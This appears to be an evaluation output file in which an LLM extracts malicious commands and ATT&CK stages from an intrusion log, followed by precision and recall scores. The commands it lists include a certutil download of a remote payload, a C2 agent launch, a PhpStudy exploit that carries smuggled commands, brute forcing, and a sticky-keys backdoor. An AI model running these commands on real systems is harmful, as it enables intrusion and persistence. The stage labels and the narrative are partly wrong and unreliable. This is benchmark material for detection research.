@@ -1,0 +1,114 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "taskkill /f /im agent.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.224.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "del /f /q PhpStudyPoc.py",
+        "stage": "Collection"
+      },
+      {
+        "command": "del /f /q PhpStudyExp2.py",
+        "stage": "Collection"
+      },
+      {
+        "command": "echo start:78cfa46d-d648-44ac-9ed8-ee7469cb82c2",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"cmd /c 'python PhpStudyExp2.py http://121.36.30.176/ '\"whoami&arp -a&ipconfig&ping www.baidu.com -c 1\"'",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "python PhpStudyExp2.py http://121.36.30.176/ \"whoami&arp -a&ipconfig&ping www.baidu.com -c 1\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "python PhpStudyExp2.py http://121.36.30.176/ \"taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:Users/Public.agent.exe&cmd /c start /min C:Users.Public.agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "WinBrute.exe administrator_pass.txt administrator",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f;",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe /f",
+        "stage": "Persistence"
+      },
+      {
+        "command": "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe /f",
+        "stage": "Persistence"
+      },
+      {
+        "command": "PAExec.exe \\192.168.0.244 -u administrator -p Data123456! ipconfig",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "PAExec.exe \\192.168.0.244 -u administrator -p Data123456! ipconfig",
+        "stage": "Credential Access"
+      }
+    ],
+    "narrative": "The attackers exploited vulnerabilities in web applications to gain an initial access point to the victim's machine via PHPStudy application. They downloaded several malicious tools such as agent.exe, ywm.exe, and servert.exe onto the machine. The attackers then launched their malicious scripts using Python and PowerShell. These scripts enabled lateral movement by exploiting vulnerabilities in various services running on the machine such as NetBIOS, WMI, and others. Additionally, they modified registry entries and added new users to escalate privileges, implemented persistence by modifying system settings, and established communication channels between machines.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 67470,
+      "completion_tokens": 1961,
+      "total_tokens": 69431,
+      "wall_clock_s": 12.825,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.5625,
+      "recall": 0.9,
+      "f1": 0.6923076923076923,
+      "tp": 9,
+      "fp": 7,
+      "fn": 1
+    },
+    "stage": {
+      "precision": 0.1875,
+      "recall": 0.42857142857142855,
+      "f1": 0.26086956521739124,
+      "tp": 3,
+      "fp": 13,
+      "fn": 4,
+      "recall_partial": 0.5833333333333334
+    },
+    "hallucination_rate": 0.1111111111111111,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 67470,
+      "completion_tokens": 1961,
+      "total_tokens": 69431,
+      "wall_clock_s": 12.825,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
